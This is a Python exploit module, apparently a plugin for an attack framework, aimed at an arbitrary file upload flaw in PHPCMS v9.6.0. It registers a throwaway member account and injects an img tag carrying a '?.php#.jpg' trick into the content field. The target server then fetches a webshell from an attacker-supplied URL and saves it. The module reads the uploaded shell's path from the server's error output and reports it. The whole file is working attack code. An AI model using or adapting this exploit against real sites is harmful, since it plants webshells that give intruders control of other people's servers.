# -*- coding: utf-8 -*-

import time
import requests
import re

__meta__ = {
    'name':        'PHPCMS v9.6.0 任意文件上传漏洞',
    'description': '通过传入 info[\'content\'] 触发 editor 操作，进一步通过 #.jpg 绕过文件名扩展检测，最终导致任意文件上传漏洞',
    'author':      'Does\'t matter',
    'references': [
        'https://paper.seebug.org/273/'
    ],
    'options': [
        { 'name': 'URL',       'required': True, 'descr': '目标URL' },
        { 'name': 'SHELL_URL', 'required': True, 'descr': 'WebShell 下载地址，e.g http://xxxx/shell.txt' },
    ]
}

def hack(base_url, shell_url):
    result = None
    name   = 'demo_{}'.format(int(time.time()))
    data   = {
        'siteid':        '1',
        'modelid':       '1',
        'dosubmit':      '1',
        'username':      name,
        'password':      'hello-world',
        'email':         '{}@163.com'.format(name),
        'info[content]': '<img src={}?.php#.jpg>'.format(shell_url)
    }

    try:
        resp  = requests.post('{}/index.php?m=member&c=index&a=register&siteid=1'.format(base_url), data = data)
        match = re.findall(r'&lt;img src=(.*uploadfile.*)&gt', resp.text)
        if 'MySQL Error' in resp.text and match:
            result = match[0]
    except Exception as e:
        print e
        pass

    return result

def run(shell, **kwargs):
    options = kwargs['options']
    result  = hack(options['URL'], options['SHELL_URL'])

    if result:
        shell.print_info("Shell uploaded: {}".format(result))




